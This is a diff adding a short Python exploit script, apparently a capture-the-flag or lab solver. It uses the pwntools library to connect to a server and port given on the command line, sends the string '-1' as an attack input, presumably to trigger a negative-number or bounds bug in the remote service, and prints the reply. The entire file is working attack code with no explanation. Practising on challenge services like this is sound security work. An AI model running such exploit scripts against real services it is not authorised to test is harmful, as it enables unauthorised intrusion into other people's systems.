@@ -1,0 +1,11 @@
+#!/usr/bin/python3
+import pwn
+import sys
+
+attack = b"-1"
+server = sys.argv[1]
+port = int(sys.argv[2])
+target = pwn.remote(server, port)  # Connect to the server
+
+target.sendline(attack)
+print(target.recvall().decode("utf-8", "ignore").strip())
